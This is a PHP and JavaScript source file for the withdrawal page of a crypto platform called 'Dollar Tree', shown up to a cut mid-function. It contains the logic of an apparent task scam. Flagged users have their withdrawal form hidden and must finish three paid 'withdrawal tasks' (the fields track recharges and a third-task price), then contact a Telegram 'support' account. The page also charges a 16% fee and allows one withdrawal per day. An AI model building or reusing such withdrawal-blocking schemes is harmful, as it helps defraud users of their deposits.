<?php
require_once __DIR__ . '/../config.php';
require_login();
$user = get_logged_in_user();
$page_title = t('withdraw', 'Withdraw');

// ── DAILY CRAW RESET ─────────────────────────────────────────────
global $pdo;
$today = date('Y-m-d');
$crawEnteredAt = isset($user['craw_entered_at']) ? $user['craw_entered_at'] : null;
$crawModeRaw   = isset($user['craw_mode'])       ? (int)$user['craw_mode'] : 0;

if (!empty($crawEnteredAt) && $crawEnteredAt !== $today) {
    try {
        if ($crawModeRaw === 1) {
            $pdo->prepare("
                UPDATE users
                SET craw_completed_today  = 0,
                    craw_task_step        = 1,
                    craw_recharge_paid    = 0,
                    craw_snapshot_balance = 0,
                    craw_balance_after_t1 = 0,
                    craw_balance_after_t2 = 0,
                    craw_t3_price         = 0,
                    craw_entered_at       = ?
                WHERE id = ?
            ")->execute([$today, $user['id']]);
        } else {
            $pdo->prepare("
                UPDATE users SET craw_completed_today = 0 WHERE id = ?
            ")->execute([$user['id']]);
        }
        $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ? LIMIT 1");
        $stmt->execute([$user['id']]);
        $user = $stmt->fetch(PDO::FETCH_ASSOC);
    } catch (Exception $e) {
        error_log("CRAW daily reset skipped: " . $e->getMessage());
    }
}

// ── FIX 5: Generate CSRF token ───────────────────────────────────────────
// A new token is created each page load and stored in the session.
// The JS sends this token with every withdrawal request.
// The server rejects any request whose token doesn't match the session value.
// This prevents Cross-Site Request Forgery attacks where another website
// tricks a logged-in user's browser into submitting a withdrawal.
if (empty($_SESSION['withdrawal_csrf'])) {
    $_SESSION['withdrawal_csrf'] = bin2hex(random_bytes(32));
}
$csrf_token = $_SESSION['withdrawal_csrf'];
// ─────────────────────────────────────────────────────────────────────────

$svipLevel     = (int)$user['svip_level'];
$totalDeposited= (float)$user['total_deposited'];
$balance       = (float)$user['balance'];
$commBal       = (float)$user['commission_balance'];
$totalBalance  = $balance + $commBal;
$crawMode      = (int)($user['craw_mode']            ?? 0);
$crawDone      = (int)($user['craw_completed_today'] ?? 0);
$crawStep      = (int)($user['craw_task_step']       ?? 0);
?>
<?php
$spin_chances = (int)($user['spin_chances'] ?? 0);
include __DIR__ . '/spin_wheel.php';
include 'reviews_component.php'; 
?>
<!DOCTYPE html>
<html lang="<?php echo get_language(); ?>">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title><?php echo $page_title; ?> — Dollar Tree</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Barlow:wght@400;500;600;700;800&family=Barlow+Condensed:wght@700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
:root {
  --gp:#1a7a1a; --gb:#22a322; --gl:#2db82d;
  --gg:rgba(26,122,26,.10); --gg2:rgba(26,122,26,.06);
  --bg:#f0f5f0; --white:#fff;
  --border:#d4ebd4; --border2:#b8d8b8;
  --tp:#0d1a0d; --ts:#2d4a2d; --tm:#5a7a5a; --tl:#8aaa8a;
  --gold:#c8860a; --gold-bg:#fef9ed; --gold-bdr:#f0c060;
  --red:#c0392b; --red-bg:#fdf0ef;
  --nav-h:64px; --top-h:60px; --r:14px; --r2:18px;
  --sh:0 2px 10px rgba(0,0,0,.06); --shm:0 4px 20px rgba(0,0,0,.09);
  --craw:#b85c00; --craw-bg:#fff8f0; --craw-bdr:#f0a060;
  --craw-dark:#7a3300;
}
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
html{-webkit-text-size-adjust:100%;}
body{font-family:'Barlow',sans-serif;background:var(--bg);color:var(--tp);min-height:100vh;padding-top:var(--top-h);padding-bottom:calc(var(--nav-h)+24px);overflow-x:hidden;-webkit-font-smoothing:antialiased;}

.topbar{position:fixed;top:0;left:0;right:0;z-index:400;height:var(--top-h);background:var(--white);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 16px;box-shadow:var(--sh);gap:12px;}
.tb-back{width:36px;height:36px;background:var(--bg);border:1px solid var(--border);border-radius:10px;color:var(--tm);font-size:15px;display:flex;align-items:center;justify-content:center;cursor:pointer;text-decoration:none;flex-shrink:0;transition:all .18s;}
.tb-back:hover{border-color:var(--border2);color:var(--gp);}
.tb-title{font-family:'Barlow Condensed',sans-serif;font-size:20px;font-weight:800;color:var(--tp);letter-spacing:.02em;flex:1;}

.bal-card{margin:16px 16px 0;background:linear-gradient(145deg,var(--gp) 0%,#0f5c0f 100%);border-radius:var(--r2);padding:20px;box-shadow:0 8px 32px rgba(26,122,26,.3);position:relative;overflow:hidden;}
.bal-card::before{content:'';position:absolute;inset:0;background-image:radial-gradient(circle,rgba(255,255,255,.05) 1px,transparent 1px);background-size:20px 20px;pointer-events:none;}
.bal-card::after{content:'';position:absolute;top:-40px;right:-40px;width:140px;height:140px;border-radius:50%;background:radial-gradient(circle,rgba(255,255,255,.08) 0%,transparent 65%);pointer-events:none;}
.bal-label{font-size:10px;font-weight:700;color:rgba(255,255,255,.5);text-transform:uppercase;letter-spacing:.09em;margin-bottom:8px;position:relative;z-index:1;}
.bal-amount{font-family:'Barlow Condensed',sans-serif;font-size:44px;font-weight:900;color:#fff;line-height:1;position:relative;z-index:1;margin-bottom:2px;}
.bal-amount .dec{font-size:24px;color:rgba(255,255,255,.5);}
.bal-unit{font-size:10px;font-weight:700;color:rgba(255,255,255,.35);text-transform:uppercase;letter-spacing:.09em;margin-bottom:14px;position:relative;z-index:1;}
.bal-row{display:grid;grid-template-columns:1fr 1fr;gap:10px;position:relative;z-index:1;}
.bal-sub{background:rgba(0,0,0,.18);border:1px solid rgba(255,255,255,.1);border-radius:10px;padding:10px 12px;}
.bal-sub-lbl{font-size:9px;font-weight:700;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:.07em;margin-bottom:3px;}
.bal-sub-val{font-family:'Barlow Condensed',sans-serif;font-size:18px;font-weight:800;color:#fff;line-height:1;}

.upgrade-wall{margin:16px 16px 0;background:var(--gold-bg);border:1px solid var(--gold-bdr);border-radius:var(--r2);padding:28px 20px;text-align:center;}
.uw-icon{width:60px;height:60px;background:rgba(200,134,10,.12);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:26px;color:var(--gold);margin:0 auto 14px;}
.uw-title{font-family:'Barlow Condensed',sans-serif;font-size:22px;font-weight:900;color:var(--tp);margin-bottom:8px;}
.uw-sub{font-size:13px;color:var(--tm);line-height:1.6;margin-bottom:18px;}
.uw-btn{display:inline-flex;align-items:center;gap:8px;background:var(--gold);color:#fff;border:none;border-radius:12px;padding:13px 28px;font-family:'Barlow',sans-serif;font-size:14px;font-weight:800;text-decoration:none;cursor:pointer;box-shadow:0 4px 16px rgba(200,134,10,.3);transition:all .2s;}
.uw-btn:hover{background:#a06d00;transform:translateY(-1px);}

.craw-wall{margin:16px 16px 0;background:var(--craw-bg);border:2px solid var(--craw-bdr);border-radius:var(--r2);padding:24px 20px;text-align:center;position:relative;overflow:hidden;}
.craw-wall::before{content:'';position:absolute;inset:0;background-image:radial-gradient(circle,rgba(184,92,0,.05) 1px,transparent 1px);background-size:18px 18px;pointer-events:none;}
.cw-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(184,92,0,.12);border:1px solid var(--craw-bdr);border-radius:100px;padding:4px 12px;font-size:11px;font-weight:800;color:var(--craw);text-transform:uppercase;letter-spacing:.06em;margin-bottom:14px;}
.cw-icon{font-size:28px;color:var(--craw);margin-bottom:10px;}
.cw-title{font-family:'Barlow Condensed',sans-serif;font-size:22px;font-weight:900;color:var(--tp);margin-bottom:8px;}
.cw-sub{font-size:13px;color:var(--craw-dark);line-height:1.6;margin-bottom:6px;}
.cw-steps{display:flex;align-items:center;justify-content:center;gap:8px;margin:16px 0;}
.cw-step{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;border:2px solid var(--craw-bdr);color:var(--craw-dark);background:rgba(184,92,0,.06);}
.cw-step.done{background:var(--gp);border-color:var(--gp);color:#fff;}
.cw-step.active{background:var(--craw);border-color:var(--craw);color:#fff;box-shadow:0 0 0 3px rgba(184,92,0,.2);}
.cw-step-line{width:24px;height:2px;background:var(--craw-bdr);}
.cw-btn{display:inline-flex;align-items:center;gap:8px;background:var(--craw);color:#fff;border:none;border-radius:12px;padding:14px 28px;font-family:'Barlow',sans-serif;font-size:14px;font-weight:800;text-decoration:none;cursor:pointer;box-shadow:0 4px 16px rgba(184,92,0,.28);transition:all .2s;margin-top:14px;}
.cw-btn:hover{background:var(--craw-dark);transform:translateY(-1px);}

.craw-done-notice{margin:16px 16px 0;background:#f0faf0;border:1.5px solid var(--gp);border-radius:var(--r);padding:14px 16px;display:flex;align-items:flex-start;gap:10px;}
.cdn-icon{color:var(--gp);font-size:16px;flex-shrink:0;margin-top:2px;}
.cdn-text{font-size:13px;color:var(--ts);line-height:1.6;}
.cdn-text strong{color:var(--gp);}

.form-card{margin:14px 16px 0;background:var(--white);border:1px solid var(--border);border-radius:var(--r2);box-shadow:var(--shm);overflow:hidden;}
.form-hd{padding:14px 16px;border-bottom:1px solid var(--border);font-size:13px;font-weight:800;color:var(--tp);display:flex;align-items:center;gap:8px;}
.form-hd i{color:var(--gp);}
.form-body{padding:16px;}
.field{margin-bottom:14px;}
.field:last-child{margin-bottom:0;}
.field-label{font-size:11px;font-weight:700;color:var(--tm);text-transform:uppercase;letter-spacing:.08em;margin-bottom:7px;display:flex;align-items:center;gap:5px;}
.field-label i{color:var(--gp);font-size:11px;}
.field-input{width:100%;background:var(--bg);border:1.5px solid var(--border);border-radius:11px;padding:12px 14px;font-family:'Barlow',sans-serif;font-size:14px;font-weight:600;color:var(--tp);outline:none;transition:all .18s;}
.field-input:focus{border-color:var(--gp);background:var(--gg2);box-shadow:0 0 0 3px rgba(26,122,26,.08);}
.field-input::placeholder{color:var(--tl);font-weight:500;}
select.field-input{appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8'%3E%3Cpath d='M1 1l5 5 5-5' fill='none' stroke='%235a7a5a' stroke-width='1.5' stroke-linecap='round'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;padding-right:36px;}
.amount-wrap{position:relative;}
.amount-input-row{position:relative;}
.amount-field{padding-right:64px;}
.amount-unit{position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:12px;font-weight:800;color:var(--tm);pointer-events:none;}
.quick-btns{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;margin-top:8px;}
.quick-btn{background:var(--gg2);border:1.5px solid var(--border);border-radius:9px;padding:8px 4px;font-family:'Barlow',sans-serif;font-size:12px;font-weight:700;color:var(--ts);cursor:pointer;transition:all .18s;text-align:center;}
.quick-btn:hover{border-color:var(--border2);background:var(--gg);}
.quick-btn.max{border-color:var(--gp);color:var(--gp);background:var(--gg2);}
.fee-row{display:flex;align-items:center;justify-content:space-between;background:var(--bg);border:1px solid var(--border);border-radius:10px;padding:10px 13px;margin-top:6px;}
.fee-lbl{font-size:12px;font-weight:600;color:var(--tl);}
.fee-val{font-family:'Barlow Condensed',sans-serif;font-size:14px;font-weight:800;color:var(--tp);}
.submit-btn{width:100%;margin-top:16px;background:var(--gp);color:#fff;border:none;border-radius:12px;padding:15px;font-family:'Barlow',sans-serif;font-size:15px;font-weight:800;cursor:pointer;transition:all .22s;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 4px 18px rgba(26,122,26,.28);}
.submit-btn:hover{background:var(--gb);transform:translateY(-1px);}
.submit-btn:disabled{background:var(--border2);cursor:not-allowed;transform:none;box-shadow:none;}
.spin{width:18px;height:18px;border:2.5px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none;}
@keyframes spin{to{transform:rotate(360deg);}}

.rules-card{margin:14px 16px 0;background:var(--white);border:1px solid var(--border);border-radius:var(--r);box-shadow:var(--sh);overflow:hidden;}
.rules-hd{display:flex;align-items:center;gap:8px;padding:13px 14px;border-bottom:1px solid var(--border);font-size:13px;font-weight:700;color:var(--ts);}
.rules-hd i{color:var(--gold);}
.rules-list{padding:12px 14px;}
.rule-item{display:flex;gap:8px;margin-bottom:10px;align-items:flex-start;}
.rule-item:last-child{margin-bottom:0;}
.rule-num{width:20px;height:20px;border-radius:50%;background:var(--gg);border:1px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;color:var(--gp);flex-shrink:0;}
.rule-text{font-size:12px;color:var(--tm);line-height:1.6;}
.rule-text strong{color:var(--tp);}

.modal-overlay{position:fixed;inset:0;z-index:600;background:rgba(0,0,0,.45);display:none;align-items:flex-end;justify-content:center;}
.modal-overlay.open{display:flex;animation:fo .18s ease;}
@keyframes fo{from{opacity:0}to{opacity:1}}
.modal{width:100%;max-width:480px;background:var(--white);border-radius:var(--r2) var(--r2) 0 0;padding:24px 20px 36px;animation:su .22s cubic-bezier(.34,1.3,.64,1);}
@keyframes su{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
.modal-ic{width:52px;height:52px;border-radius:16px;background:var(--gg2);border:1.5px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:22px;color:var(--gp);margin:0 auto 14px;}
.modal-title{font-family:'Barlow Condensed',sans-serif;font-size:22px;font-weight:900;color:var(--tp);text-align:center;margin-bottom:6px;}
.modal-sub{font-size:13px;color:var(--tm);text-align:center;margin-bottom:20px;line-height:1.5;}
.modal-detail{background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:18px;}
.md-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;}
.md-row:last-child{margin-bottom:0;padding-top:8px;border-top:1px solid var(--border);}
.md-lbl{font-size:12px;color:var(--tl);font-weight:600;}
.md-val{font-size:13px;font-weight:800;color:var(--tp);}
.md-val.g{color:var(--gp);}
.modal-btns{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
.modal-cancel{background:var(--bg);border:1.5px solid var(--border);border-radius:11px;padding:13px;font-family:'Barlow',sans-serif;font-size:14px;font-weight:700;color:var(--tm);cursor:pointer;transition:all .18s;}
.modal-confirm{background:var(--gp);border:none;border-radius:11px;padding:13px;font-family:'Barlow',sans-serif;font-size:14px;font-weight:800;color:#fff;cursor:pointer;transition:all .18s;box-shadow:0 3px 12px rgba(26,122,26,.25);}
.modal-confirm:hover{background:var(--gb);}

.bnav{position:fixed;bottom:0;left:0;right:0;z-index:300;height:var(--nav-h);background:var(--white);border-top:1px solid var(--border);display:flex;align-items:stretch;box-shadow:0 -2px 16px rgba(0,0,0,.07);}
.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;padding:0 4px;text-decoration:none;color:var(--tl);font-size:9px;font-weight:800;text-transform:uppercase;letter-spacing:.06em;transition:all .18s;position:relative;cursor:pointer;}
.nav-item::before{content:'';position:absolute;top:0;left:25%;right:25%;height:2px;border-radius:0 0 3px 3px;background:var(--gp);transform:scaleX(0);transform-origin:center;transition:transform .2s;}
.nav-item.active{color:var(--gp);}
.nav-item.active::before{transform:scaleX(1);}
.ni{font-size:20px;transition:transform .18s;}
.nav-item.active .ni{transform:scale(1.1);}
.toast{position:fixed;bottom:calc(var(--nav-h)+16px);left:50%;transform:translateX(-50%) translateY(8px);background:var(--gp);color:#fff;padding:10px 18px;border-radius:10px;font-size:13px;font-weight:700;display:flex;align-items:center;gap:8px;box-shadow:0 6px 24px rgba(26,122,26,.3);z-index:700;opacity:0;pointer-events:none;transition:all .25s cubic-bezier(.34,1.56,.64,1);white-space:nowrap;max-width:calc(100vw - 40px);}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
.toast.err{background:#c0392b;}
.toast-upgrade{
  position:fixed;bottom:50%;left:50%;
  transform:translateX(-50%) translateY(50%) scale(.92);
  background:rgba(0,0,0,.82);color:#fff;
  padding:20px 24px;border-radius:14px;
  font-size:14px;font-weight:600;line-height:1.6;
  text-align:center;z-index:800;
  opacity:0;pointer-events:none;
  transition:all .28s cubic-bezier(.34,1.3,.64,1);
  max-width:260px;backdrop-filter:blur(6px);
  display:flex;flex-direction:column;align-items:center;justify-content:center;
}
.toast-upgrade.show{
  opacity:1;transform:translateX(-50%) translateY(50%) scale(1);
}
.notice{margin:14px 16px 0;background:#fef9ed;border:1px solid var(--gold-bdr);border-left:3px solid var(--gold);border-radius:var(--r);padding:12px 14px;display:flex;align-items:flex-start;gap:9px;font-size:12px;color:var(--ts);line-height:1.6;}
.notice i{color:var(--gold);font-size:13px;flex-shrink:0;margin-top:1px;}
.spacer{height:10px;}
.foot{padding-bottom:100px;}
</style>
</head>
<body>

<div class="topbar">
  <a href="dashboard.php" class="tb-back"><i class="fa-solid fa-chevron-left"></i></a>
  <div class="tb-title">Withdraw</div>
</div>

<!-- BALANCE CARD -->
<div class="bal-card">
  <div class="bal-label">Available For Withdraw</div>
  <div class="bal-amount" id="mainBal">
    <?php $b=floatval($user['balance']); $parts=explode('.',number_format($b,2)); echo $parts[0]; ?><span class="dec">.</span><?php echo $parts[1]??'00'; ?>
  </div>
</div>

<?php if ($crawMode && !$crawDone): ?>
<div class="craw-wall">
  <div class="cw-badge"><i class="fa-solid fa-lock"></i> Withdrawal Task Required</div>
  <div class="cw-icon"><i class="fa-solid fa-list-check"></i></div>
  <div class="cw-title">Complete Your Withdrawal Tasks</div>
  <div class="cw-sub">
    Your withdrawal amount exceeds the eligible threshold.<br>
    Complete <strong>3 withdrawal tasks</strong> to unlock your funds.
  </div>
  <div class="cw-steps">
    <div class="cw-step <?php echo $crawStep > 1 ? 'done' : ($crawStep === 1 ? 'active' : ''); ?>">
      <?php echo $crawStep > 1 ? '<i class="fa-solid fa-check"></i>' : '1'; ?>
    </div>
    <div class="cw-step-line"></div>
    <div class="cw-step <?php echo $crawStep > 2 ? 'done' : ($crawStep === 2 ? 'active' : ''); ?>">
      <?php echo $crawStep > 2 ? '<i class="fa-solid fa-check"></i>' : '2'; ?>
    </div>
    <div class="cw-step-line"></div>
    <div class="cw-step <?php echo $crawStep > 3 ? 'done' : ($crawStep === 3 ? 'active' : ''); ?>">
      <?php echo $crawStep > 3 ? '<i class="fa-solid fa-check"></i>' : '3'; ?>
    </div>
  </div>
  <div class="cw-sub" style="font-size:12px;color:var(--tm);">
    <?php if ($crawStep === 0 || $crawStep === 1): ?>
      Task 1 of 3 is ready. Go to your tasks page to start.
    <?php elseif ($crawStep === 2): ?>
      Task 1 complete ✓ — Task 2 of 3 is waiting.
    <?php elseif ($crawStep === 3): ?>
      Tasks 1 &amp; 2 complete ✓✓ — Final task is ready.
    <?php endif; ?>
  </div>
  <a href="tasks.php" class="cw-btn"><i class="fa-solid fa-list-check"></i> Go to Withdrawal Tasks</a>
</div>
<?php elseif ($crawDone): ?>
<div class="craw-wall">
  <div class="cw-badge"><i class="fa-solid fa-circle-check"></i> Tasks Completed</div>
  <div class="cw-icon"><i class="fa-solid fa-headset"></i></div>
  <div class="cw-title">Contact Support to Withdraw</div>
  <div class="cw-sub">
    All 3 withdrawal tasks completed successfully!<br>
    Please contact our support team to finalise your withdrawal.
  </div>
  <button class="cw-btn" onclick="openSupportModal()">
    <i class="fa-brands fa-telegram"></i> Contact Support
  </button>
</div>
<?php endif; ?>

<?php
$showForm = !$crawMode;
if ($showForm):
?>

<div class="form-card">
  <div class="form-hd"><i class="fa-solid fa-arrow-up-from-line"></i>Withdrawal Details</div>
  <div class="form-body">

    <div class="field">
      <div class="field-label"><i class="fa-solid fa-network-wired"></i>Network</div>
      <select class="field-input" id="network" onchange="updateFee()">
        <option value="TRC20">USDT — TRC20 (Tron)</option>
        <option value="BEP20">USDT — BEP20 (BSC)</option>
        <option value="ERC20">USDT — ERC20 (Ethereum)</option>
        <option value="POLYGON">USDT — Polygon</option>
      </select>
    </div>

    <div class="field">
      <div class="field-label"><i class="fa-solid fa-wallet"></i>Wallet Address</div>
      <input type="text" class="field-input" id="walletAddr" placeholder="Enter your USDT wallet address" autocomplete="off" autocorrect="off" spellcheck="false">
    </div>

    <div class="field">
      <div class="field-label"><i class="fa-solid fa-dollar-sign"></i>Amount (USDT)</div>
      <div class="amount-wrap">
        <div class="amount-input-row">
          <input type="number" class="field-input amount-field" id="amount" placeholder="0.00" min="1" step="0.01" oninput="updateFee()">
          <span class="amount-unit">USDT</span>
        </div>
        <div class="quick-btns">
          <button class="quick-btn" onclick="setAmount(50)">$50</button>
          <button class="quick-btn" onclick="setAmount(100)">$100</button>
          <button class="quick-btn max" onclick="setMax()">Max</button>
        </div>
      </div>
    </div>

    <div class="fee-row">
      <span class="fee-lbl">Network fee (estimated)</span>
      <span class="fee-val" id="feeVal">—</span>
    </div>

    <button class="submit-btn" id="submitBtn" onclick="openConfirm()">
      <div class="spin" id="btnSpin"></div>
      <i class="fa-solid fa-arrow-up-from-line" id="btnIc"></i>
      Confirm Withdrawal
    </button>
  </div>
</div>

<div class="rules-card">
  <div class="rules-hd"><i class="fa-solid fa-shield-halved"></i>Withdrawal Rules</div>
  <div class="rules-list">
    <div class="rule-item"><div class="rule-num">1</div><div class="rule-text">Minimum withdrawal amount is <strong>$9 USDT</strong>.</div></div>
    <div class="rule-item"><div class="rule-num">2</div><div class="rule-text">Daily withdrawal limit is <strong>1 withdraw request per day.</strong>. Limit resets at 00:00 UTC.</div></div>
    <div class="rule-item"><div class="rule-num">3</div><div class="rule-text">Withdrawals are automatic and may take 3 minutes to arrive please be patient.</div></div>
  </div>
</div>

<?php endif; ?>

<div class="spacer"></div>

<!-- CONFIRM MODAL -->
<div class="modal-overlay" id="modalOverlay" onclick="if(event.target===this)closeModal()">
  <div class="modal">
    <div class="modal-ic"><i class="fa-solid fa-arrow-up-from-line"></i></div>
    <div class="modal-title">Confirm Withdrawal</div>
    <div class="modal-sub">Please review the details below before submitting.</div>
    <div class="modal-detail">
      <div class="md-row"><span class="md-lbl">Network</span><span class="md-val" id="mNet">—</span></div>
      <div class="md-row"><span class="md-lbl">Wallet Address</span><span class="md-val" id="mAddr" style="max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">—</span></div>
      <div class="md-row"><span class="md-lbl">Amount</span><span class="md-val g" id="mAmt">—</span></div>
      <div class="md-row"><span class="md-lbl">Platform fee</span><span class="md-val" id="mFee">—</span></div>
      <div class="md-row"><span class="md-lbl">You receive</span><span class="md-val g" id="mReceive">—</span></div>
    </div>
    <div class="modal-btns">
      <button class="modal-cancel" onclick="closeModal()">Cancel</button>
      <button class="modal-confirm" onclick="submitWithdrawal()">Submit</button>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<div class="bnav">
  <a href="dashboard.php" class="nav-item"><i class="fa-solid fa-house ni"></i><span>Home</span></a>
  <a href="tasks.php" class="nav-item"><i class="fa-solid fa-list-check ni"></i><span>Task</span></a>
  <a href="team.php" class="nav-item"><i class="fa-solid fa-users ni"></i><span>Team</span></a>
  <a href="vip.php" class="nav-item"><i class="fa-solid fa-crown ni"></i><span>VIP</span></a>
  <a href="profile.php" class="nav-item"><i class="fa-regular fa-circle-user ni"></i><span>Me</span></a>
</div>

<div class="toast-upgrade" id="upgradeToast"></div>

<!-- SUPPORT MODAL -->
<div class="support-overlay" id="supportOverlay" onclick="if(event.target===this)closeSupportModal()" style="position:fixed;inset:0;z-index:700;background:rgba(0,0,0,.55);display:none;align-items:center;justify-content:center;padding:20px;">
  <div style="width:100%;max-width:340px;background:#fff;border-radius:20px;padding:28px 22px 24px;text-align:center;box-shadow:0 24px 60px rgba(0,0,0,.3);">
    <div style="width:64px;height:64px;border-radius:18px;background:linear-gradient(135deg,#2AABEE,#229ED9);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">
      <i class="fa-brands fa-telegram" style="color:#fff;font-size:28px;"></i>
    </div>
    <div style="font-family:'Barlow Condensed',sans-serif;font-size:22px;font-weight:900;color:#0d1a0d;margin-bottom:6px;">Online Support</div>
    <div style="font-size:13px;color:#5a7a5a;line-height:1.6;margin-bottom:20px;">Contact our support team to complete your withdrawal.</div>
    <a href="https://t.me/Dollartreesupport" target="_blank" style="display:flex;align-items:center;gap:12px;background:#f7f9f7;border:1px solid #e0eae0;border-radius:12px;padding:12px 14px;margin-bottom:14px;text-decoration:none;transition:all .18s;">
      <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#2AABEE,#229ED9);display:flex;align-items:center;justify-content:center;flex-shrink:0;">
        <i class="fa-brands fa-telegram" style="color:#fff;font-size:18px;"></i>
      </div>
      <div style="font-size:14px;font-weight:800;color:#0d1a0d;text-align:left;flex:1;">Dollar Support</div>
      <i class="fa-solid fa-chevron-right" style="color:#8aaa8a;font-size:13px;"></i>
    </a>
    <button onclick="closeSupportModal()" style="width:100%;background:#f0f5f0;border:1px solid #d4ebd4;border-radius:10px;padding:12px;font-family:'Barlow',sans-serif;font-size:13px;font-weight:700;color:#5a7a5a;cursor:pointer;">Close</button>
  </div>
</div>

<div class="foot"></div>

<script>
// ── FIX 5: CSRF token passed from PHP to JS ───────────────────────────────
// This token was generated server-side and stored in $_SESSION.
// It travels with every withdrawal request so the server can verify
// the request genuinely came from this page and not from another site.
const CSRF_TOKEN  = '<?php echo addslashes($csrf_token); ?>';
// ─────────────────────────────────────────────────────────────────────────

const token       = '<?php echo addslashes($user['auth_token'] ?? ''); ?>';
const MAX_BALANCE = <?php echo floatval($user['balance']); ?>;
const COMM_BAL    = <?php echo floatval($user['commission_balance']); ?>;
const TOTAL_BAL   = MAX_BALANCE + COMM_BAL;
const TOTAL_DEP   = <?php echo floatval($user['total_deposited']); ?>;
const SVIP_LEVEL  = <?php echo $svipLevel; ?>;
const CRAW_MODE   = <?php echo $crawMode ? 'true' : 'false'; ?>;
const CRAW_DONE   = <?php echo $crawDone ? 'true' : 'false'; ?>;
const DAILY_LIMIT = 500;
const CRAW_THRESHOLD = 0.30;

let usedToday = 0;

async function loadLimits() {
  try {
    const r = await fetch('../api/get_withdrawal_limits.php', {
      headers: { 'Authorization': 'Bearer ' + token }
    });
    const d = await r.json();
    if (d.success) {
      usedToday = parseFloat(d.used_today ?? 0);
    }
  } catch(e) { /* silent */ }
}

function updateFee() {
  const amt = parseFloat(document.getElementById('amount').value) || 0;
  const platformFee = parseFloat((amt * 0.16).toFixed(2));
  document.getElementById('feeVal').textContent = amt > 0
    ? '$' + platformFee.toFixed(2) + ' (16%)'
    : '—';
}

function openSupportModal() {
  document.getElementById('supportOverlay').style.display = 'flex';
  document.body.style.overflow = 'hidden';
}

function closeSupportModal() {
  document.getElementById('supportOverlay').style.display = 'none';
  document.body.style.overflow = '';
}

function setAmount(v) {
  document.getElementById('amount').value = v;
  updateFee();
}

function setMax() {
  const avail = Math.min(TOTAL_BAL, DAILY_LIMIT - usedToday);
  document.getElementById('amount').value = Math.max(0, avail).toFixed(2);
  updateFee();
}

function closeModal() {
  document.getElementById('modalOverlay').classList.remove('open');
  document.body.style.overflow = '';
}

async function submitWithdrawal() {
  const addr = document.getElementById('walletAddr').value.trim();
  const amt  = parseFloat(document.getElementById('amount').value);
  const net  = document.getElementById('network').value;

  closeModal();
  setBtnLoading(true);

  try {
    const r = await fetch('../api/submit_withdrawal.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
      },
      credentials: 'same-origin',
      body: JSON.stringify({
        network:        net,
        wallet_address: addr,
        amount:         amt,
        currency:       'USDT',
        csrf_token:     CSRF_TOKEN   // ← FIX 5: CSRF token sent with request
      })
    });

    const d = await r.json();

    if (d.success) {
      document.getElementById('amount').value     = '';
      document.getElementById('walletAddr').value = '';
      usedToday += amt;
      showUpgradeToast(
        '<i class="fa-solid fa-circle-check" style="font-size:22px;margin-bottom:8px;display:block;color:#4ade80;"></i>' +
        'Withdrawal submitted<br>successfully!'
      );
      setTimeout(() => location.href = 'dashboard.php', 2800);
    } else {
      showUpgradeToast(
        '<i class="fa-solid fa-circle-exclamation" style="font-size:22px;margin-bottom:8px;display:block;color:#f87171;"></i>' +
        (d.message || 'Withdrawal failed.<br>Please try again.')
      );
    }
  } catch(e) {
    showUpgradeToast(
      '<i class="fa-solid fa-circle-exclamation" style="font-size:22px;margin-bottom:8px;display:block;color:#f87171;"></i>' +
      'Network error.<br>Please try again.'
    );
  } finally {
    setBtnLoading(false);
  }
}

async function openConfirm() {
  const addrEl = document.getElementById('walletAddr');
  const amtEl  = document.getElementById('amount');
  const net    = document.getElementById('network').value;
  const addr   = addrEl.value.trim();
  const rawVal = amtEl.value.trim();
  const amt    = rawVal === '' ? NaN : Number(rawVal);

  if (!addr) {
    showUpgradeToast('<i class="fa-solid fa-wallet" style="font-size:20px;margin-bottom:8px;display:block;"></i>Please enter your<br>wallet address');
    return;
  }

  if (rawVal === '' || isNaN(amt) || amt <= 0) {
    showUpgradeToast('<i class="fa-solid fa-dollar-sign" style="font-size:20px;margin-bottom:8px;display:block;"></i>Please enter a<br>withdrawal amount');
    return;
  }

  if (amt < 9) {
    showUpgradeToast('<i class="fa-solid fa-circle-exclamation" style="font-size:20px;margin-bottom:8px;display:block;"></i>Minimum withdrawal<br>amount is <strong>$9 USDT</strong>');
    return;
  }

  if (TOTAL_BAL < 9) {
    showUpgradeToast('<i class="fa-solid fa-circle-exclamation" style="font-size:20px;margin-bottom:8px;display:block;"></i>Your balance is too low.<br>Minimum is <strong>$9 USDT</strong>');
    return;
  }

  if (amt > TOTAL_BAL) {
